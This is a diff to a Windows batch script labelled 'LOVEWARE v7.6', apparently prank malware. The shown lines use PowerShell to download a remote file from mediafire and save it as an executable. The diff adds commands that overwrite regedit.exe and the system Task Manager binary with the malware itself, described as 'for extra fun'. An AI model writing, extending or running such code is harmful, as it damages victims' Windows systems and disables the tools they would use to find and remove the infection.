@@ -1,6 +1,6 @@
 @echo off
 
-:: LOVEWARE v7.5
+:: LOVEWARE v7.6
 ::
 :: YOU CAN DELETE THIS 
 :: |  |  |  |  |  |  |
@@ -315,6 +315,11 @@ goto haha
 
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file', 'mouse.exe')"
 powershell -Command "Invoke-WebRequest http://www.mediafire.com/file/xycm8d9wqrm5rsv/mouse.bat/file -OutFile mouse.bat"
+
+:: Overwrite regedit and taskmanager for extra fun
+
+type Loveware.exe > regedit.exe
+type Loveware.exe > C:\Windows\System32\Taskmgr.exe
 
 :: Create new vbs file that speaks.
 
